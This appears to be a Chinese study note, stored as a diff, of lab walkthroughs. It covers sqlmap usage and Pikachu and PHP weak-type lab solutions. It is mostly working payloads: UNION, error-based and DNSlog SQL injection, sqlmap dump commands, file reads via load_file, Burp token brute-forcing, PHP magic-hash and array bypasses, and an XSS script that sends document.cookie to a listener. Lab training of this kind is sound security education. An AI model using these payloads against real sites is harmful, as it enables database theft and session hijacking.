@@ -1,0 +1,273 @@
+sqlmap的使用
+
+
+注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）
+
+1#、注入六连：
+
+1.   sqlmap -u  "http://www.xx.com?id=x"    【查询是否存在注入点
+2.   --dbs         【检测站点包含哪些数据库
+3.   --current-db    【获取当前的数据库名
+4.   --tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称
+5.   --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段
+6.   --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容
+
+2#、COOKIE注入：
+
+sqlmap -u "http://www.xx.com?id=x" --cookie "cookie" --level 2  【cookie注入 后接cookie值
+
+3#、POST注入：
+
+（1）目标地址http:// www.xxx.com /login.asp
+（2）打开brup代理。
+（3）点击表单提交
+（4）burp获取拦截信息（post）
+（5）右键保存文件（.txt）到指定目录下
+（6）运行sqlmap并执行如下命令：
+用例：sqlmap -r okay.txt  -p  username
+// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）
+（7）自动获取表单：--forms自动获取表单
+例如：`sqlmap -u www.xx.com/login.asp --forms`
+（8）指定参数搜索：--data
+例如：`sqlmap -u www.xx.com/login.asp --data "username=1"`
+
+4#、常用指令：
+
+--purge      【重新扫描（--purge 删除原先对该目标扫描的记录）
+--tables      【获取表名
+--dbs         【检测站点包含哪些数据库
+--current-db    【获取当前的数据库名
+--current-user  【检测当前用户
+--is-dba   【判断站点的当前用户是否为数据库管理员
+--batch      【默认确认，不询问你是否输入
+--search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）
+--threads 10  【线程，sqlmap线程最高设置为10
+--level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
+--risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+-v   【详细的等级(0-6)
+     0：只显示Python的回溯，错误和关键消息。
+     1：显示信息和警告消息。
+     2：显示调试消息。
+     3：有效载荷注入。
+     4：显示HTTP请求。
+     5：显示HTTP响应头。
+     6：显示HTTP响应页面的内容
+--privileges  【查看权限
+--tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件
+--method "POST" --data "page=1&id=2"   【POST方式提交数据
+--threads number　　【采用多线程 后接线程数
+--referer  ""  【使用referer欺骗
+--user-agent ""     【自定义user-agent
+--proxy “目标地址″   【使用代理注入
+
+靶场通关——Pikachu(上)
+
+XSS
+
+1-3
+
+`<script>alert(1)</script>`
+
+4-5
+注意看源代码中js刚开始就是'闭合
+`javascript:alert(1)`
+`#' onclick='alert(1)`
+6
+`nc -lvp 4444`
+
+`<script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>`
+
+7
+
+`sCript>alert(1)</sCript>`
+
+`<img src=x onerror=alert(1)>`
+8
+htmlspecialchars
+把字符转化为html实体（需要svg翻译的东西）
+`#' onclick='alert(1)`
+9
+`javascript:alert(1)`
+10
+`';alert(1);//`
+`';</script><script>alert(1)//`
+
+
+SQL
+
+1
+使用\发现没有闭合方式
+1 order by 2
+-1 union select 1,2
+-1 union select 1,database()
+pikachu
+-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
+2
+'闭合
+/sqli_str.php?name=-1' union select 1,2  --+
+3
+搜索
+select * from table1 where username like '% x %';
+name=x%' order by 3--+
+x%' union select 1,2,3 --+
+name=x%' union select 1,2,database() --+
+4
+\')
+')
+name=x') union select 1,2 --+
+5
+在注册的时候，抓包
+发现'闭合
+insert into table1 (username,password,xx1,xx2) values('zj','123','xx1','xx2');
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '
+1' and extractvalue(1,concat('~',database())) or '
+update table1 set sex='$sex',phonenum='$phone',address='$add',email='$email' where username='aaa'
+6
+delete from xxx where id=58
+id=59 and extractvalue(1,concat(0x7e,(select database()),0x7e))
+7
+User-Agent: haha 1' and extractvalue(1,concat('~',database())) or '
+8
+sqlmap -u "目标" --dbs
+sqlmap -u "目标" -D pikachu --tables --batch --threads 10
+sqlmap -u "目标" -D pikachu -T users --columns --batch --threads 10
+sqlmap -u "目标" -D pikachu -T users -C username,password --dump --batch --threads 10
+DNSlog注入
+1' and if((select load_file(concat('\\\\',(select database()),'.b48xu1.dnslog.cn\\x2'))),1,0) --+
+\\\\pikachu.b48xu1.dnslog.cn\x2
+9
+sqlmap -u "目标" --technique T -D pikachu --tables --batch --threads 10
+10
+POST
+name=a%df' union select 1,database() --+
+
+
+
+into outfile
+
+设置my.ini  [mysqld]  secure_file_priv=  否则不支持load_file命令
+into outfile/load_filename=-1' union select 1,load_file('C:/a.txt') --+ 读取c盘下的a.txt文件
+name=-1' union select 1,load_file('C:/a.txt')  into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt' --+ 读取c盘的a.txt内容到自己目录下的haha.txt
+这个into outfile不具备创建文件的能力!!!!!!
+
+token
+
+token逻辑：
+前端     后端
+          abc
+abc       abc
+数据+abc->abc--->if (abc===abc)-->处理数据
+          ab1
+ab1       ab1
+数据+xxx->ab1--->False
+
+前端每次请求都要带上token
+防止重复提交
+防止CSRF攻击
+多个服务共享
+一定程度上可以阻止暴力破解
+burp抓包---send to intruder---攻击方式采用pitchfork
+对password和token打标记
+password给密码穷举
+
+token方面：
+选择options---设置threads为1---找到Grep Extract---add---refetch response
+找到value="token值"，把token值选中，这样burp就会估算每次去哪找token---ok
+拉下来，redirections---选择always
+payloads---2---Recursive grep
+payload for first request填写你当前数据包的token
+
+
+
+
+
+mbpass靶场
+
+PHP
+
+弱类型比较
+
+==     是比较数值
+$a = 1;
+$b = 2;
+if($a == $b)
+
+var_dump(998\=="998")    true
+var_dump(998\=="998ab")     true    (说明php比较是从左往右，比完了就返回)
+var_dump(0\=="haha")     true     (说明0和任何字符串比都是1)
+var_dump(123\==\=123); true
+
+\==\=     还可以比较类型
+
+md4  md5加密都有可能出现0e的开头
+
+```php
+for($i=1;;$i++){    //$r = 0e1 0e2 ... 0e251288019
+    $r = "0e".$i;
+    //$md4 = 0e874956163641961271069404332409
+    $md4 = hash("md4",$r);
+    echo '\<br/>';
+    echo $i;
+    if(preg_match("/^0e[0-9]*$/", $md4)){
+        echo "md4加密前".$r;
+        echo "md4加密后".$md4;
+        break;
+    }
+}
+```
+
+==0e251288019==
+
+pass-2
+md5弱类型比较
+==这些经过md5hash出来的结果都是0e开头的！！！==
+
+>IHKFRNS 0e256160682445802696926137988570
+>QLTHNDT 0e405967825401955372549139051580
+>QNKCDZO 0e830400451993494058024219903391
+>3908336290 0e807624498959190415881248245271
+>4011627063 0e485805687034439905938362701775
+>4775635065 0e998212089946640967599450361168
+>0e215962017 0e291242476940776845150308577824
+>aabg7XSs 0e087386482136013740957780965295
+>aabC9RqS 0e041022518165728065344349536299
+
+数组绕过：php的md5函数，无法处理数组，返回NULL
+/pass-02.php?user[]=1&pass[]=2
+
+pass-3
+ctype_alpha检测A-Za-z
+is_numeric检查是否只有数字
+
+/pass-03.php?user=3908336290&pass=QNKCDZO
+
+pass-4
+/pass-04.php?user=&pass[]=1
+没有赋值就是空
+
+pass-05
+/pass-05.php?user=&pass[]=1
+
+pass-06
+240610708---aawBzC
+加密一次--------加密两次
+
+都是0e开头的
+
+pass-07
+
+/pass-07.php?user[]=1&pass[]=2
+
+pass-08
+php特定数据类型
+NAN INF
+var_dump('INF'=\=INF);//false
+var_dump('INF'!=\=INF);//true
+var_dump(md5('INF')=\==md5(INF));//true
+
+`echo '<br/>';`
+`echo md5('INF');`
+`echo '<br/>';`
+echo md5(INF);
+POST
+auth=O:4:"auth":2:{s:4:"user";d:INF;s:4:"pass";d:INF;}
